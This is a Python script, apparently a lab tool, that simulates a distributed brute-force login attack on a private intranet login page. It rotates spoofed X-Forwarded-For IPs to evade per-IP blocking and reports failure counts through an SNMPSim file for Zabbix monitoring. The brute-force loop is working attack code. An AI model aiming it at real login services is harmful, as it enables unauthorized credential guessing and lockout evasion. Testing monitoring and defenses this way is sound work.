import asyncio
import httpx
import random
import os
import time

TARGET_URL = os.getenv("TARGET_URL", "https://10.10.100.4/login")
LOGIN_TYPE = os.getenv("LOGIN_TYPE", "student")
CONCURRENCY = int(os.getenv("CONCURRENCY", "10"))
# Define o caminho do arquivo lido pelo SNMPSim
SNMPREC_PATH = os.getenv("SNMPREC_PATH", "security_monitor.snmprec") 

usernames = ["admin", "root", "professor", "aluno", "joao", "maria", "pedro", "test", "user", "guest"]

# Variáveis globais de estado para o Zabbix
total_failures = 0
failure_timestamps = [] # Lista para calcular as falhas na última 1h
active_ips = {}         # Dicionário (IP -> timestamp) para rastrear IPs ativos
is_attacking = 1

async def attack_worker(worker_id):
    global total_failures, failure_timestamps, active_ips
    
    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
        while True:
            ip = f"{random.randint(11,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            user = random.choice(usernames)
            password = f"senha_{random.randint(100, 9999)}"
            
            headers = {"X-Forwarded-For": ip}
            data = {"username": user, "password": password, "login_type": LOGIN_TYPE}
            
            try:
                resp = await client.post(TARGET_URL, data=data, headers=headers, follow_redirects=False)
                now = time.time()
                
                # Registra que este IP está ativo neste exato momento
                active_ips[ip] = now
                
                if resp.status_code == 302:
                    loc = resp.headers.get("location", "")
                    if "error=blocked" in loc:
                        print(f"[Worker {worker_id}] [!] IP {ip} BLOQUEADO após múltiplas tentativas pelo sistema.", flush=True)
                    else:
                        print(f"[Worker {worker_id}] Tentativa falha ({ip}): {user}:{password}", flush=True)
                        total_failures += 1
                        failure_timestamps.append(now)
                else:
                    print(f"[Worker {worker_id}] Resp {resp.status_code} ({ip}) - {user}:{password}", flush=True)
                    total_failures += 1
                    failure_timestamps.append(now)
            except Exception as e:
                print(f"[Worker {worker_id}] Erro na conexão: {e}", flush=True)
            
            await asyncio.sleep(0.1)

async def update_snmprec():
    """Tarefa em background que atualiza o arquivo lido pelo SNMPSim"""
    global total_failures, failure_timestamps, active_ips, is_attacking
    
    while True:
        now = time.time()
        
        # Mantém apenas as falhas dos últimos 3600 segundos (1 hora)
        failure_timestamps = [t for t in failure_timestamps if now - t <= 3600]
        falhas_1h = len(failure_timestamps)
        
        # Mantém apenas os IPs que atacaram nos últimos 300 segundos (5 minutos)
        active_ips = {ip: t for ip, t in active_ips.items() if now - t <= 300}
        ips_ativos_count = len(active_ips)
        
        # Monta o conteúdo respeitando a tipagem '66' (Gauge32/Unsigned) do SNMPSim
        snmprec_content = f"""1.3.6.1.2.1.1.5.0|4|Monitoramento de Seguranca Intranet
1.3.6.1.4.1.99999.1.1.0|66|{total_failures}
1.3.6.1.4.1.99999.1.2.0|66|{falhas_1h}
1.3.6.1.4.1.99999.1.3.0|66|{ips_ativos_count}
1.3.6.1.4.1.99999.1.4.0|66|{is_attacking}
"""
        try:
            # Sobrescreve o arquivo
            with open(SNMPREC_PATH, "w") as f:
                f.write(snmprec_content)
        except Exception as e:
            print(f"[SNMP Updater] Erro ao escrever {SNMPREC_PATH}: {e}")
            
        # Aguarda 5 segundos antes de atualizar os dados novamente
        await asyncio.sleep(5)

async def main():
    print(f"--- Iniciando Simulação de Brute Force Distribuído (Botnet) ---", flush=True)
    print(f"Alvo: {TARGET_URL}", flush=True)
    print(f"Tipo de Login: {LOGIN_TYPE}", flush=True)
    print(f"Nível de Concorrência (Threads): {CONCURRENCY}", flush=True)
    
    # Inicia a rotina de atualização do arquivo SNMPREC paralelamente aos ataques
    asyncio.create_task(update_snmprec())
    
    tasks = [attack_worker(i) for i in range(CONCURRENCY)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())